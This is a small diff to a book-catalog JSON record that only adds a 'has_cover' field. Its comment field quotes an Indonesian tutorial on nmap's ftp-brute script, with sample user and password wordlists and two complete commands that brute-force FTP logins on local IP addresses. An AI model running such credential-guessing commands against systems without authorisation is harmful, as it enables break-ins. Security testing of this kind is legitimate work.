@@ -39,6 +39,7 @@
   ],
   "cover_url": "/cover_thumb/12241?v=1795442000",
   "cover_og_url": "/cover/12241/og?v=1795442000",
+  "has_cover": false,
   "url": "/book/nmap-brute-force-hack-ftp-password-onno-widodo-purbo/",
   "rating": null,
   "comment": "Script types: portrule Categories: intrusive, brute Download: https://svn.nmap.org/nmap/scripts/ftp-brute.nse isi user.txt admin root onno dll isi pass.txt 123456789 123456 12345 dll nmap -p21 -script ftp-brute.nse -script-args \\ userdb=/root/user.txt,passdb=/root/pass.txt 192.168.1.105 nmap -p21 -script ftp-brute.nse -script-args \\ userdb=user.txt,passdb=pass.txt 192.168.3.47 Contoh Output",
